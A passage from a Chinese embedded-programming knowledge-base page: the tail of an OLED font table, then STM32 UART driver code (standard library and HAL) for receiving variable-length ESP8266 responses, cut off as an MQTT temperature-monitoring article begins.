	0x00,0x30,0x08,0x88,0x88,0x48,0x30,0x00,
	0x00,0x18,0x20,0x20,0x20,0x11,0x0E,0x00,//3 19
	
	0x00,0x00,0xC0,0x20,0x10,0xF8,0x00,0x00,
	0x00,0x07,0x04,0x24,0x24,0x3F,0x24,0x00,//4 20
	
	0x00,0xF8,0x08,0x88,0x88,0x08,0x08,0x00,
	0x00,0x19,0x21,0x20,0x20,0x11,0x0E,0x00,//5 21
	
	0x00,0xE0,0x10,0x88,0x88,0x18,0x00,0x00,
	0x00,0x0F,0x11,0x20,0x20,0x11,0x0E,0x00,//6 22
	
	0x00,0x38,0x08,0x08,0xC8,0x38,0x08,0x00,
	0x00,0x00,0x00,0x3F,0x00,0x00,0x00,0x00,//7 23
	
	0x00,0x70,0x88,0x08,0x08,0x88,0x70,0x00,
	0x00,0x1C,0x22,0x21,0x21,0x22,0x1C,0x00,//8 24
	
	0x00,0xE0,0x10,0x08,0x08,0x10,0xE0,0x00,
	0x00,0x00,0x31,0x22,0x22,0x11,0x0F,0x00,//9 25
	
	0x00,0x00,0x00,0xC0,0xC0,0x00,0x00,0x00,
	0x00,0x00,0x00,0x30,0x30,0x00,0x00,0x00,//: 26
	
	0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x00,
	0x00,0x00,0x80,0x60,0x00,0x00,0x00,0x00,//; 27
	
	0x00,0x00,0x80,0x40,0x20,0x10,0x08,0x00,
	0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x00,//&lt; 28
	
	0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x00,
	0x04,0x04,0x04,0x04,0x04,0x04,0x04,0x00,//= 29
	
	0x00,0x08,0x10,0x20,0x40,0x80,0x00,0x00,
	0x00,0x20,0x10,0x08,0x04,0x02,0x01,0x00,//&gt; 30
	
	0x00,0x70,0x48,0x08,0x08,0x08,0xF0,0x00,
	0x00,0x00,0x00,0x30,0x36,0x01,0x00,0x00,//? 31
	
	0xC0,0x30,0xC8,0x28,0xE8,0x10,0xE0,0x00,
	0x07,0x18,0x27,0x24,0x23,0x14,0x0B,0x00,//@ 32
	
	0x00,0x00,0xC0,0x38,0xE0,0x00,0x00,0x00,
	0x20,0x3C,0x23,0x02,0x02,0x27,0x38,0x20,//A 33
	
	0x08,0xF8,0x88,0x88,0x88,0x70,0x00,0x00,
	0x20,0x3F,0x20,0x20,0x20,0x11,0x0E,0x00,//B 34
	
	0xC0,0x30,0x08,0x08,0x08,0x08,0x38,0x00,
	0x07,0x18,0x20,0x20,0x20,0x10,0x08,0x00,//C 35
	
	0x08,0xF8,0x08,0x08,0x08,0x10,0xE0,0x00,
	0x20,0x3F,0x20,0x20,0x20,0x10,0x0F,0x00,//D 36
	
	0x08,0xF8,0x88,0x88,0xE8,0x08,0x10,0x00,
	0x20,0x3F,0x20,0x20,0x23,0x20,0x18,0x00,//E 37
	
	0x08,0xF8,0x88,0x88,0xE8,0x08,0x10,0x00,
	0x20,0x3F,0x20,0x00,0x03,0x00,0x00,0x00,//F 38
	
	0xC0,0x30,0x08,0x08,0x08,0x38,0x00,0x00,
	0x07,0x18,0x20,0x20,0x22,0x1E,0x02,0x00,//G 39
	
	0x08,0xF8,0x08,0x00,0x00,0x08,0xF8,0x08,
	0x20,0x3F,0x21,0x01,0x01,0x21,0x3F,0x20,//H 40
	
	0x00,0x08,0x08,0xF8,0x08,0x08,0x00,0x00,
	0x00,0x20,0x20,0x3F,0x20,0x20,0x00,0x00,//I 41
	
	0x00,0x00,0x08,0x08,0xF8,0x08,0x08,0x00,
	0xC0,0x80,0x80,0x80,0x7F,0x00,0x00,0x00,//J 42
	
	0x08,0xF8,0x88,0xC0,0x28,0x18,0x08,0x00,
	0x20,0x3F,0x20,0x01,0x26,0x38,0x20,0x00,//K 43
	
	0x08,0xF8,0x08,0x00,0x00,0x00,0x00,0x00,
	0x20,0x3F,0x20,0x20,0x20,0x20,0x30,0x00,//L 44
	
	0x08,0xF8,0xF8,0x00,0xF8,0xF8,0x08,0x00,
	0x20,0x3F,0x00,0x3F,0x00,0x3F,0x20,0x00,//M 45
	
	0x08,0xF8,0x30,0xC0,0x00,0x08,0xF8,0x08,
	0x20,0x3F,0x20,0x00,0x07,0x18,0x3F,0x00,//N 46
	
	0xE0,0x10,0x08,0x08,0x08,0x10,0xE0,0x00,
	0x0F,0x10,0x20,0x20,0x20,0x10,0x0F,0x00,//O 47
	
	0x08,0xF8,0x08,0x08,0x08,0x08,0xF0,0x00,
	0x20,0x3F,0x21,0x01,0x01,0x01,0x00,0x00,//P 48
	
	0xE0,0x10,0x08,0x08,0x08,0x10,0xE0,0x00,
	0x0F,0x18,0x24,0x24,0x38,0x50,0x4F,0x00,//Q 49
	
	0x08,0xF8,0x88,0x88,0x88,0x88,0x70,0x00,
	0x20,0x3F,0x20,0x00,0x03,0x0C,0x30,0x20,//R 50
	
	0x00,0x70,0x88,0x08,0x08,0x08,0x38,0x00,
	0x00,0x38,0x20,0x21,0x21,0x22,0x1C,0x00,//S 51
	
	0x18,0x08,0x08,0xF8,0x08,0x08,0x18,0x00,
	0x00,0x00,0x20,0x3F,0x20,0x00,0x00,0x00,//T 52
	
	0x08,0xF8,0x08,0x00,0x00,0x08,0xF8,0x08,
	0x00,0x1F,0x20,0x20,0x20,0x20,0x1F,0x00,//U 53
	
	0x08,0x78,0x88,0x00,0x00,0xC8,0x38,0x08,
	0x00,0x00,0x07,0x38,0x0E,0x01,0x00,0x00,//V 54
	
	0xF8,0x08,0x00,0xF8,0x00,0x08,0xF8,0x00,
	0x03,0x3C,0x07,0x00,0x07,0x3C,0x03,0x00,//W 55
	
	0x08,0x18,0x68,0x80,0x80,0x68,0x18,0x08,
	0x20,0x30,0x2C,0x03,0x03,0x2C,0x30,0x20,//X 56
	
	0x08,0x38,0xC8,0x00,0xC8,0x38,0x08,0x00,
	0x00,0x00,0x20,0x3F,0x20,0x00,0x00,0x00,//Y 57
	
	0x10,0x08,0x08,0x08,0xC8,0x38,0x08,0x00,
	0x20,0x38,0x26,0x21,0x20,0x20,0x18,0x00,//Z 58
	
	0x00,0x00,0x00,0xFE,0x02,0x02,0x02,0x00,
	0x00,0x00,0x00,0x7F,0x40,0x40,0x40,0x00,//[ 59
	
	0x00,0x0C,0x30,0xC0,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x01,0x06,0x38,0xC0,0x00,//\ 60
	
	0x00,0x02,0x02,0x02,0xFE,0x00,0x00,0x00,
	0x00,0x40,0x40,0x40,0x7F,0x00,0x00,0x00,//] 61
	
	0x00,0x00,0x04,0x02,0x02,0x02,0x04,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,//^ 62
	
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x80,0x80,0x80,0x80,0x80,0x80,0x80,0x80,//_ 63
	
	0x00,0x02,0x02,0x04,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,//` 64
	
	0x00,0x00,0x80,0x80,0x80,0x80,0x00,0x00,
	0x00,0x19,0x24,0x22,0x22,0x22,0x3F,0x20,//a 65
	
	0x08,0xF8,0x00,0x80,0x80,0x00,0x00,0x00,
	0x00,0x3F,0x11,0x20,0x20,0x11,0x0E,0x00,//b 66
	
	0x00,0x00,0x00,0x80,0x80,0x80,0x00,0x00,
	0x00,0x0E,0x11,0x20,0x20,0x20,0x11,0x00,//c 67
	
	0x00,0x00,0x00,0x80,0x80,0x88,0xF8,0x00,
	0x00,0x0E,0x11,0x20,0x20,0x10,0x3F,0x20,//d 68
	
	0x00,0x00,0x80,0x80,0x80,0x80,0x00,0x00,
	0x00,0x1F,0x22,0x22,0x22,0x22,0x13,0x00,//e 69
	
	0x00,0x80,0x80,0xF0,0x88,0x88,0x88,0x18,
	0x00,0x20,0x20,0x3F,0x20,0x20,0x00,0x00,//f 70
	
	0x00,0x00,0x80,0x80,0x80,0x80,0x80,0x00,
	0x00,0x6B,0x94,0x94,0x94,0x93,0x60,0x00,//g 71
	
	0x08,0xF8,0x00,0x80,0x80,0x80,0x00,0x00,
	0x20,0x3F,0x21,0x00,0x00,0x20,0x3F,0x20,//h 72
	
	0x00,0x80,0x98,0x98,0x00,0x00,0x00,0x00,
	0x00,0x20,0x20,0x3F,0x20,0x20,0x00,0x00,//i 73
	
	0x00,0x00,0x00,0x80,0x98,0x98,0x00,0x00,
	0x00,0xC0,0x80,0x80,0x80,0x7F,0x00,0x00,//j 74
	
	0x08,0xF8,0x00,0x00,0x80,0x80,0x80,0x00,
	0x20,0x3F,0x24,0x02,0x2D,0x30,0x20,0x00,//k 75
	
	0x00,0x08,0x08,0xF8,0x00,0x00,0x00,0x00,
	0x00,0x20,0x20,0x3F,0x20,0x20,0x00,0x00,//l 76
	
	0x80,0x80,0x80,0x80,0x80,0x80,0x80,0x00,
	0x20,0x3F,0x20,0x00,0x3F,0x20,0x00,0x3F,//m 77
	
	0x80,0x80,0x00,0x80,0x80,0x80,0x00,0x00,
	0x20,0x3F,0x21,0x00,0x00,0x20,0x3F,0x20,//n 78
	
	0x00,0x00,0x80,0x80,0x80,0x80,0x00,0x00,
	0x00,0x1F,0x20,0x20,0x20,0x20,0x1F,0x00,//o 79
	
	0x80,0x80,0x00,0x80,0x80,0x00,0x00,0x00,
	0x80,0xFF,0xA1,0x20,0x20,0x11,0x0E,0x00,//p 80
	
	0x00,0x00,0x00,0x80,0x80,0x80,0x80,0x00,
	0x00,0x0E,0x11,0x20,0x20,0xA0,0xFF,0x80,//q 81
	
	0x80,0x80,0x80,0x00,0x80,0x80,0x80,0x00,
	0x20,0x20,0x3F,0x21,0x20,0x00,0x01,0x00,//r 82
	
	0x00,0x00,0x80,0x80,0x80,0x80,0x80,0x00,
	0x00,0x33,0x24,0x24,0x24,0x24,0x19,0x00,//s 83
	
	0x00,0x80,0x80,0xE0,0x80,0x80,0x00,0x00,
	0x00,0x00,0x00,0x1F,0x20,0x20,0x00,0x00,//t 84
	
	0x80,0x80,0x00,0x00,0x00,0x80,0x80,0x00,
	0x00,0x1F,0x20,0x20,0x20,0x10,0x3F,0x20,//u 85
	
	0x80,0x80,0x80,0x00,0x00,0x80,0x80,0x80,
	0x00,0x01,0x0E,0x30,0x08,0x06,0x01,0x00,//v 86
	
	0x80,0x80,0x00,0x80,0x00,0x80,0x80,0x80,
	0x0F,0x30,0x0C,0x03,0x0C,0x30,0x0F,0x00,//w 87
	
	0x00,0x80,0x80,0x00,0x80,0x80,0x80,0x00,
	0x00,0x20,0x31,0x2E,0x0E,0x31,0x20,0x00,//x 88
	
	0x80,0x80,0x80,0x00,0x00,0x80,0x80,0x80,
	0x80,0x81,0x8E,0x70,0x18,0x06,0x01,0x00,//y 89
	
	0x00,0x80,0x80,0x80,0x80,0x80,0x80,0x00,
	0x00,0x21,0x30,0x2C,0x22,0x21,0x30,0x00,//z 90
	
	0x00,0x00,0x00,0x00,0x80,0x7C,0x02,0x02,
	0x00,0x00,0x00,0x00,0x00,0x3F,0x40,0x40,//{ 91
	
	0x00,0x00,0x00,0x00,0xFF,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0xFF,0x00,0x00,0x00,//| 92
	
	0x00,0x02,0x02,0x7C,0x80,0x00,0x00,0x00,
	0x00,0x40,0x40,0x3F,0x00,0x00,0x00,0x00,//} 93
	
	0x00,0x06,0x01,0x01,0x02,0x02,0x04,0x04,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,//~ 94
};

#endif

</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1Fx4y1Q7Dh/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">江科大OLED移植到HAL库_哔哩哔哩_bilibili</a></li>
<li><a href="https://www.bilibili.com/video/BV1th411z7sn/?spm_id_from=333.337.search-card.all.click">STM32入门教程-2023版 细致讲解 中文字幕_哔哩哔哩_bilibili</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/599310595">OLED(含IIC)——跟我一起写STM32(第六期) - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/keep_moving_tzw/article/details/104877286">【STM32F103笔记】9、I2C通信——玩转OLED（OLED命令详解）_stm32f103xx iic 库函数 oled-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link ">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link ">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link highlight">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2867239616" class="record">
            <header>
                <h1 class="record-title">串口驱动程序之「不定长字符串的接收」</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('串口');">串口</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('ESP8266');">ESP8266</button>
                    
                    <button class="btn" onclick="activeTag('驱动');">驱动</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/4/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240412000200.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>以 ESP8266 为例。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>aae69ac0</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>主要思路：</p>
<ol>
<li>在标准库例子中的思路是，若收到串口空闲中断，则设置定时器。定时器时间到则认为串口接收完毕，置标志位。</li>
<li>在 HAL 库例子中的思路是，收到每一个字符都设置定时器，定时器时间到则认为串口接收完毕，置标志位。</li>
</ol>
<p>本文假设的场景：</p>
<ol>
<li>串口 1 连接电脑。<code>printf</code> 重写，输出至串口 1。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></li>
<li>串口 2 连接 ESP8266。<code>ESP8266_Printf</code> 函数重写 <code>sprintf</code>，输出到串口 2。</li>
<li>函数 <code>uint8_t ESP8266_Cmd(uint8_t *cmd,uint8_t *expect_ack,uint16_t waittime)</code> 用于发送 AT 命令，并将收到结果回显至电脑（解注释 printf）。</li>
</ol>
<h1>标准库</h1>
<p>ESP8266 驱动：</p>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header
#include &lt;stdarg.h&gt; // sprintf
#include &lt;stdio.h&gt; // printf
#include &lt;string.h&gt;
#include &quot;esp8266.h&quot;
#include &quot;timer.h&quot;
#include &quot;Systick.h&quot;

#define USART2_MAX_SEND_LEN 600
uint8_t USART2_TX_BUF[USART2_MAX_SEND_LEN]; 			//发送缓冲,最大USART2_MAX_SEND_LEN字节

USART_Buffer ESP8266_Buffer;
void USART2_IRQHandler(void) {
    if (USART_GetITStatus(USART2, USART_IT_RXNE) != RESET) {
        if (ESP8266_Buffer.Length &lt; (USART_RX_BUF_SIZE - 1))
            ESP8266_Buffer.Body[ESP8266_Buffer.Length++] = (char)USART_ReceiveData(USART2);
    }
    if (USART_GetITStatus(USART2, USART_IT_IDLE) != RESET) {
//        ESP8266_Buffer.FinishFlag = 1;
        ESP8266_Buffer.Body[ESP8266_Buffer.Length] = '\0';
        volatile uint16_t temp; //编译器在优化代码时可能会移除那些看似不必要的重复读取或写入操作
		// 清除串口空闲中断标志位
        temp = USART2-&gt;SR;
        temp = USART2-&gt;DR;
		
		TIM_SetCounter(TIM2,0);//计数器清空 
		TIM_Cmd(TIM2,ENABLE);//使能定时器2
		// 处理包的回调函数
//		printf(&quot;USART_Buffer:\r\n%s&quot;,(const char*)ESP8266_Buffer.Body);
    }
}


//定时器2中断服务程序		    
void TIM2_IRQHandler(void)
{ 	
	if (TIM_GetITStatus(TIM2, TIM_IT_Update) != RESET)//是更新中断
	{	 			   
		ESP8266_Buffer.FinishFlag = 1;
		TIM_ClearITPendingBit(TIM2, TIM_IT_Update  );  //清除TIM2更新中断标志    
		TIM_Cmd(TIM2, DISABLE);  //关闭TIM2 
	}	    
	
	printf(&quot;Now Buffer:\r\n%s&quot;,(uint8_t*)ESP8266_Buffer.Body);
//	printf(&quot;time2 yes\r\n&quot;);
}



// 默认115200
void ESP8266_Init(uint32_t baud)
{
	RCC_APB1PeriphClockCmd(RCC_APB1Periph_USART2,ENABLE);
	RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA,ENABLE);
	
	// 发送
	GPIO_InitTypeDef GPIO_InitStructure;
	GPIO_InitStructure.GPIO_Mode=GPIO_Mode_AF_PP; // 复用推挽
	GPIO_InitStructure.GPIO_Pin=GPIO_Pin_2;		// 发送
	GPIO_InitStructure.GPIO_Speed=GPIO_Speed_50MHz;
	GPIO_Init(GPIOA,&amp;GPIO_InitStructure);
	// 接收
	GPIO_InitStructure.GPIO_Mode=GPIO_Mode_IPU; // 上拉输入
	GPIO_InitStructure.GPIO_Pin=GPIO_Pin_3;		// 接收
	GPIO_InitStructure.GPIO_Speed=GPIO_Speed_50MHz;
	GPIO_Init(GPIOA,&amp;GPIO_InitStructure);
	
	USART_DeInit(USART2);  //复位串口2
	USART_InitTypeDef USART_InitStruture;
	USART_InitStruture.USART_BaudRate=baud; // 波特率
	USART_InitStruture.USART_HardwareFlowControl=USART_HardwareFlowControl_None;// 不使用流控制
	USART_InitStruture.USART_Mode=USART_Mode_Tx | USART_Mode_Rx; // 同时开启发送和接收
	USART_InitStruture.USART_Parity=USART_Parity_No; // 不需要校验位
	USART_InitStruture.USART_StopBits=USART_StopBits_1;// 1 位停止位
	USART_InitStruture.USART_WordLength=USART_WordLength_8b; // 字长
	USART_Init(USART2,&amp;USART_InitStruture);
	
	// 接收-中断方式
	USART_ITConfig(USART2,USART_IT_RXNE,ENABLE);//USART_IT_RXNE一旦置1，将会向NVIC申请中断
	USART_ITConfig(USART2, USART_IT_IDLE, ENABLE);
	NVIC_PriorityGroupConfig(NVIC_PriorityGroup_2);
	NVIC_InitTypeDef NVIC_InitStructure;
	NVIC_InitStructure.NVIC_IRQChannel=USART2_IRQn;
	NVIC_InitStructure.NVIC_IRQChannelCmd=ENABLE;
	NVIC_InitStructure.NVIC_IRQChannelPreemptionPriority=2;
	NVIC_InitStructure.NVIC_IRQChannelSubPriority=3;
	NVIC_Init(&amp;NVIC_InitStructure);
	
	USART_Cmd(USART2,ENABLE);
	
	Timer_Init(0,20000-1,7200-1);		//10ms中断
	TIM_Cmd(TIM2,DISABLE);			//关闭定时器2
}

void ESP8266_SendByte(uint8_t byte)
{
	USART_SendData(USART2,byte); // 标志位自动清零
	while(USART_GetFlagStatus(USART2,USART_FLAG_TXE)==RESET);
	
	// 不需要手动清零
}


/*
	可以在main函数中使用printf，这将输出到指定串口中。
	如果有多个串口需要输出。建议使用sprintf。再使用对应串口的ESP8266_SendString。
	或者直接使用以下的封装函数
*/
void ESP8266_Printf(char *format,...)
{
//	char String[100];
	va_list arg;
	va_start(arg,format);
	vsprintf((char*)USART2_TX_BUF,format,arg);
	va_end(arg);
	
	u16 i,j; 
	i=strlen((const char*)USART2_TX_BUF);		//此次发送数据的长度
//	printf(&quot;length:%d,%s&quot;,i,(const char*)USART2_TX_BUF);
	for(j=0;j&lt;i;j++){
		ESP8266_SendByte(USART2_TX_BUF[j]);
	}
}



uint8_t ESP8266_Cmd(char *cmd,char *expect_ack,u16 waittime){
	ESP8266_Printf(&quot;%s\r\n&quot;,cmd);
	uint8_t chk=0;
	while(waittime--)	//等待倒计时
	{
		Delay_ms(10);
		if(ESP8266_Buffer.FinishFlag)//接收到期待的应答结果
		{
			
			chk=ESP8266_Check_Str(ESP8266_Buffer.Body,expect_ack);
			if(chk){
				Delay_xms(20);
				ESP8266_Buffer.Length =0 ;
				ESP8266_Buffer.Body[ESP8266_Buffer.Length] = '\0';
				break;//得到有效数据 
			}
			
			ESP8266_Buffer.FinishFlag = 0; // 清除标志位
		} 
		if(!waittime){
			printf(&quot;Time Out!\r\n&quot;);
			return 1; // Err
		}
	}
	return 0; // OK
}

uint8_t ESP8266_Check_Str(char* check,char* espect){
	char *strx=0;
	strx=strstr((const char*)check,(const char*)espect);
	if(strx)
		return 1;
	else
		return 0;
}

</code></pre>
<h1>HAL</h1>
<p>ESP8266 驱动：</p>
<pre><code class="language-c">#include &quot;esp8266.h&quot;

#include &lt;string.h&gt;
#include &lt;stdarg.h&gt; // sprintf
//#include &quot;usart.h&quot;
#include &quot;cmsis_os.h&quot;

uint8_t TxBuf[DATA_MAX];
uint8_t RxBuf[DATA_MAX];
uint8_t RxPoint = 0, RxData;
uint8_t UART2_Rx_flg=0;

void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart)
{
	if (huart == &amp;huart2)
	{
	  __HAL_TIM_SET_COUNTER(&amp;htim2,0);
	  if (RxPoint &gt; DATA_MAX-1)
	  {
		RxPoint = 0;
		RxBuf[0] = 0;
		UART2_Rx_flg = 0;
		printf(&quot;Received too much data!\r\n&quot;);
		return;
	  }
	  
	  if(RxPoint == 0){
		  __HAL_TIM_CLEAR_FLAG(&amp;htim2,TIM_FLAG_UPDATE);
			HAL_TIM_Base_Start_IT(&amp;htim2);
	  }
	  
		RxBuf[RxPoint++] = RxData;
		HAL_UART_Receive_IT(&amp;huart2, &amp;RxData, 1);

	}
}

void ESP8266_Printf(char *format,...)
{
	va_list arg;
	va_start(arg,format);
	vsprintf((char*)TxBuf,format,arg);
	va_end(arg);
	
	HAL_UART_Transmit(&amp;huart2,TxBuf,strlen((const char*)TxBuf),0xffff);
}

uint8_t ESP8266_Cmd(uint8_t *cmd,uint8_t *expect_ack,uint16_t waittime){
	ESP8266_Printf(&quot;%s\r\n&quot;,cmd);
	uint8_t chk=0;
	while(waittime--)	//等待倒计时
	{
		osDelay(10);
		if(UART2_Rx_flg)//接收到期待的应答结果
		{
			
			chk=ESP8266_Check_Str(RxBuf,expect_ack);
			if(chk){
				osDelay(20);
//				printf(&quot;Receive: %s\r\n&quot;,RxBuf);
				RxBuf[0] = 0;
				RxPoint = 0;
				UART2_Rx_flg = 0; // 清除标志位
				break;//得到有效数据 
			}
			UART2_Rx_flg = 0; // 清除标志位
		} 
		
		if(!waittime){
			printf(&quot;Time Out!\r\n&quot;);
			return 1; // Err
		}
	}
	return 0; // OK
}



uint8_t ESP8266_Check_Str(uint8_t* check,uint8_t* espect){
	char *strx=0;
	strx=strstr((const char*)check,(const char*)espect);
	if(strx)
		return 1;
	else
		return 0;
}


</code></pre>
<p>main.c</p>
<pre><code class="language-c">int main(void)
{
	HAL_UART_Receive_IT(&amp;huart2, (uint8_t *)&amp;RxData, 1); // 记得使能
  while (1)
  {
  }

}
</code></pre>
<p>FreeRTOS.c：</p>
<pre><code class="language-c">// 定时器中断
void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim)
{
  /* USER CODE BEGIN Callback 1 */
	if(htim-&gt;Instance == TIM2)
  {
    UART2_Rx_flg = 1;
    HAL_TIM_Base_Stop_IT(&amp;htim2);//关闭定时器
  }
  /* USER CODE END Callback 1 */
}
</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/geek_monkey/article/details/89326199">HAL库教程9：串口接收不定长数据_hal库接收串口不定长数据-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/u010031883/article/details/79078930">STM32 USART 接收任意长度字符_stm32f4 读取字符串长度-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1545394726">
                            <a href="#1545394726">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>串口驱动程序之「发送数据」</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>串口 1 连接电脑。<code>printf</code> 重写，输出至串口 1。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link highlight">串口驱动程序之「发送数据」</a></li>
<li>串口 2 连接 ESP8266。<code>ESP8266_Printf</code> 函数重写 <code>sprintf</code>，输出到串口 2。</li>
<li>函数 <code>uint8_t ESP8266_Cmd(uint8_t *cmd,uint8_t *expect_ack,uint16_t waittime)</code> 用于发送 AT 命令，并将收到结果回显至电脑（解注释 printf）。</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link highlight">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link ">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link ">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3727808739" class="record">
            <header>
                <h1 class="record-title">STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('STM32');">STM32</button>
                    
                    <button class="btn" onclick="activeTag('阿里云');">阿里云</button>
                    
                    <button class="btn" onclick="activeTag('DHT11');">DHT11</button>
                    
                    <button class="btn" onclick="activeTag('ESP8266');">ESP8266</button>
                    
                    <button class="btn" onclick="activeTag('MQTT');">MQTT</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('HAL');">HAL</button>
                    
                    <button class="btn" onclick="activeTag('FreeRTOS');">FreeRTOS</button>
                    
                    <button class="btn" onclick="activeTag('STM32CubeMX');">STM32CubeMX</button>
                    
                    <button class="btn" onclick="activeTag('UML');">UML</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/5/2024</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>de31d8e3</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240405161606.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>一整套「嵌入式」入门练习</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>标题直接 Buff 点满......</p>
</blockquote>
<h1>阅读指引</h1>
<p>如果你是 0 基础选手，建议先阅读以下内容掌握基本的 FreeRTOS 工程知识：</p>
<ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link ">STM32 移植 FreeRTOS - 基于标准库</a></li>
